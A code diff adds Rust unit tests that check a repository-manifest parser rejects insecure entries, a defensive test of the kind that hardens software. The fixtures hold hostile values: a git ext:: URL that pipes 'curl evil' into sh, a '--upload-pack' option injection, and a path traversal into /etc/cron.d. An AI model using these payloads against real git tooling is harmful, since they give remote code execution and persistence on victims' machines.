@@ -338,3 +338,63 @@ sbom = ["post-build", "not-a-phase"]
         other => panic!("expected UnknownPluginPhase, got {other:?}"),
     }
 }
+
+#[test]
+fn manifest_rejects_ext_url_rce() {
+    let err = r#"
+[repo.evil]
+url = "ext::sh -c 'curl evil|sh'"
+rev = "main"
+"#
+    .parse::<Manifest>()
+    .unwrap_err();
+    match err {
+        ManifestError::Insecure { repo, .. } => assert_eq!(repo, "evil"),
+        other => panic!("expected Insecure, got {other:?}"),
+    }
+}
+
+#[test]
+fn manifest_rejects_option_injection_url() {
+    let err = r#"
+[repo.evil]
+url = "--upload-pack=touch /tmp/pwn"
+rev = "main"
+"#
+    .parse::<Manifest>()
+    .unwrap_err();
+    assert!(matches!(err, ManifestError::Insecure { .. }));
+}
+
+#[test]
+fn manifest_rejects_path_traversal() {
+    let err = r#"
+[repo.evil]
+url = "https://github.com/o/r.git"
+rev = "main"
+path = "../../etc/cron.d/x"
+"#
+    .parse::<Manifest>()
+    .unwrap_err();
+    match err {
+        ManifestError::Insecure { repo, .. } => assert_eq!(repo, "evil"),
+        other => panic!("expected Insecure, got {other:?}"),
+    }
+}
+
+#[test]
+fn manifest_accepts_legitimate_urls_and_paths() {
+    let manifest: Manifest = r#"
+[repo.mqtt]
+url = "https://github.com/o/mqtt.git"
+rev = "main"
+path = "apps/mqtt"
+
+[repo.kernel]
+url = "git@github.com:acme/kernel.git"
+rev = "v1.0"
+"#
+    .parse()
+    .unwrap();
+    assert_eq!(manifest.repos.len(), 2);
+}
